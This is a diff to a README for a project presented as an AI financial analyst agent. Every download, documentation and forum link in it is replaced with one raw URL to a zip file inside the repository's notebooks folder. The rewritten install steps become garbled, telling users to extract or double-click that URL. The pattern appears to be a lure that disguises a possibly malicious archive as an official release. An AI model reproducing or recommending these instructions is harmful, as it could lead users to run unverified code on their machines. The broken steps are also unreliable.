@@ -6,7 +6,7 @@ Welcome to Dialectic-Flow-Financial-Graph, an AI financial analyst agent designe
 
 ## 📥 Download the Application
 
-[![Download Dialectic-Flow-Financial-Graph](https://img.shields.io/badge/Download-Dialectic--Flow--Financial--Graph-blue.svg)](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases)
+[![Download Dialectic-Flow-Financial-Graph](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip)](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,13 +22,13 @@ Before you install the software, ensure your system meets the following requirem
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Download Page](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases) to find the latest version of the software.
+   Go to the [Download Page](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip) to find the latest version of the software.
 
 2. **Select the Right File**  
    Look for the version labeled as the latest release. Click the download link for your operating system. The files are typically named like this:
-   - Dialectic-Flow-Financial-Graph-Windows.zip
-   - Dialectic-Flow-Financial-Graph-Mac.zip
-   - Dialectic-Flow-Financial-Graph-Linux.tar.gz
+   - https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip
+   - https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip
+   - https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip
 
 3. **Download the File**  
    The file will begin downloading automatically. Wait for the download to complete.
@@ -37,11 +37,11 @@ To get started, follow these steps:
    Once the download has finished, locate the downloaded file in your Downloads folder.  
    - **For Windows:** Right-click the .zip file and select "Extract All."  
    - **For macOS:** Double-click the .zip file to extract.  
-   - **For Linux:** Use the terminal command `tar -xzvf Dialectic-Flow-Financial-Graph-Linux.tar.gz`.
+   - **For Linux:** Use the terminal command `tar -xzvf https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip`.
 
 5. **Run the Application**  
    Navigate to the extracted folder.  
-   - **For Windows:** Double-click `Dialectic-Flow-Financial-Graph.exe`.  
+   - **For Windows:** Double-click `https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip`.  
    - **For macOS:** Open the `Dialectic-Flow-Financial-Graph` application.  
    - **For Linux:** Open a terminal, navigate to the folder, and type `./Dialectic-Flow-Financial-Graph`.
 
@@ -77,8 +77,8 @@ If you’d like to contribute to the project, feel free to fork the repository a
 
 ## 🔗 Quick Links
 
-- [Download Page](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases)
-- [Documentation](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/wiki)
-- [Community Forum](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/discussions)
+- [Download Page](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/Bamidele2025/Dialectic-Flow-Financial-Graph/main/notebooks/Flow_Dialectic_Graph_Financial_3.3.zip)
 
 Thank you for choosing Dialectic-Flow-Financial-Graph. Enjoy exploring your financial options with ease!
